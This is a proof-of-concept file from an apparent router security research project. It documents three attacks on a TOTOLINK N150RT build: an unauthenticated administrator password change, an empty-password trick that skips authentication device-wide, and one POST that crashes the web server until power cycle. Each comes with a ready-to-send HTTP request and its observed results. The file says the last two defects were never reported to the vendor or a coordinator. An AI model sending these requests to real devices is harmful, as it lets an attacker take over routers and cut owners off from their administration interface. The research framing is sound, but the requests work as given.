# PoC 04 — unauthenticated password change, empty-password auth skip, and one POST that removes the web server

**This file was a stub from 2026-08-17 to 2026-08-23** and carried no request,
because `docs/disclosure.md` held that a reproduction for an unreported defect is
a zero-day recipe. On 2026-08-23 that rule was replaced — §"The decision of
2026-08-23" — and the requests are below. **Nothing here was reported to a
coordinator or to the vendor, and the register says so with its argument.**

## Scope

| | |
|---|---|
| verified on hardware | 2026-08-17, the 2018-01-10 build, `TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002`, `/bin/boa` `sha256 19fe29d7…` |
| verified in emulation | partially — the `formSchedule` result was reproduced by the `--alignfix` handler sweep across 58 handlers |
| present statically, **not executed** | V2.1.2-B20150825, V3.4.0-B20201030 |
| not tested at all | every other build, and every other model |

## What an attacker gains here that they did not already have: nothing

Stated first, because it is the honest frame and everything below reads
differently without it. On this build, **CVE-2024-51228** gives unauthenticated
root command execution with a public proof of concept that names this exact build
string ([`02-command-injection.md`](02-command-injection.md)), and
**CVE-2019-19822** hands over the plaintext administrator credentials to one
unauthenticated `GET /config.dat` ([`01-config-disclosure.md`](01-config-disclosure.md)).
Everything in this file is reachable from either. What follows is worth reading
as **mechanism**, not as capability.

---

## A — unauthenticated administrator password change · `P10-3` · **CVE-2018-13315**

**Not this project's finding.** Published 2018-07-03 against the sibling
TOTOLINK A3002RU 1.0.8, CVSS 9.8, by Independent Security Evaluators; this
project re-found it independently on 2026-08-17 and did not identify the CVE
until 2026-08-23. That gap is written up in
[`prior-art.md`](../notes/prior-art.md) §2026-08-23.

The form carries fields for the **current** credentials — `Cusername`,
`Cpassword` — and the handler does not consult them. The only check that ever
looks at them is JavaScript in the page being submitted
([`password-page-credentials.md`](../notes/password-page-credentials.md)).

```http
POST /boafrm/formPasswordSetup HTTP/1.1
Host: <device>
Content-Type: application/x-www-form-urlencoded

username=<new>&newpass=<new>&confpass=<new>&submit-url=%2Fstatus.htm
```

No `Authorization` header. No current-password field of any kind.

```text
response                     302
old credentials, gated page  200 -> 302
new credentials, gated page  302 -> 200
```

**Control, same session:** the same request carrying a *wrong* `Cpassword`, and
one carrying the *correct* `Cpassword`, behave identically. That is what shows
the fields are ignored rather than optional — an omitted field could have been
defaulted, two contradictory values cannot both be accepted by a check.

## B — an empty stored password skips the comparison device-wide · `P10-4`

**No prior art found**, including in ISE's twelve. It is reachable only *through*
A, which is eight years public, so it is a second stage on a published first one.
The branch is at `0x0040bd18`, read at instruction level in W04-2 before it was
fired.

Set the stored password empty, using A so that no credentials are needed at any
point:

```http
POST /boafrm/formPasswordSetup HTTP/1.1
Host: <device>
Content-Type: application/x-www-form-urlencoded

username=<name>&newpass=&confpass=&submit-url=%2Fstatus.htm
```

Afterwards, with **no `Authorization` header at all**:

```text
GET /password.htm    200, 5,322 bytes of the real page   (302 before)
GET /home.htm        200
GET /wlbasic.htm     200
GET /ddns.htm        200
```

**And with a *wrong* password: also 200.** So the comparison is skipped
entirely rather than matching empty against empty — which is the distinction that
separates this from [`05-auth-bypass.md`](05-auth-bypass.md), where the stored
password is set and the comparison runs.

⚠️ **This one writes to flash.** It changes `USER_PASSWORD` in the settings
region. `runsheet.md` `A3.11.3` restores the credentials and verifies the
restore; W05 established that an unauthenticated write also moves the
factory-default region (`D-10`), so "reset to defaults" is not a way back.

## C — one unauthenticated POST removes the web server until power cycle · `D-11`

**No register row**: it came out of a handler census rather than a planned test.
**No prior art found for the mechanism**; the class is saturated — see
[`prior-art.md`](../notes/prior-art.md) §2026-08-23 for the D-Link
`formNewSchedule` report, which is the same SDK and a near-identical handler name
but an overlong-`submit-url` overflow rather than this.

```http
POST /boafrm/formSchedule HTTP/1.1
Host: <device>
Content-Type: application/x-www-form-urlencoded

submit-url=%2Fschedule.htm
```

A legal, well-formed request. No overlong value, no metacharacter, no
credentials, and the handler's `webpage` parameter simply absent.

```text
client            no response at all, connection gone
30 s later        listening socket still absent
ICMP to device    still answering, ~1.6 ms
```

The device keeps routing; only `boa` is gone. `/etc/init.d/rcS` starts it once
and nothing respawns it, so the administration interface does not come back
without a power cycle.

**Control, run immediately before on the same boot:** three POSTs of exactly this
shape to `/boafrm/formNtp`, each returned 302, server still serving. So this is
the handler and not the *N*th request after boot — which is what separates it
from `D-9`, where volume is the mechanism.

**Independently narrowed:** the `--alignfix` emulated sweep probed 58 handlers,
58 restarts, 57 survived, and the one that died was `formSchedule`. That reduced
an earlier 39-handler candidate list to one **by computation rather than by
choice**, and it agrees with the device.

**Not measured, and it matters for triage:** whether `boa` crashes or hangs, and
which parameter shape is the trigger. This kernel's `dmesg` is empty and `boa`
writes no core.

---

## What is still not published here

Tradecraft, unchanged and not affected by the 2026-08-23 decision: no
persistence, no anti-forensics, no lateral movement, no credential harvesting on
a live host. Nine such items are in [`test-ledger.md`](../test-ledger.md) with
their reasons, and no gate in this project asks for any of them.
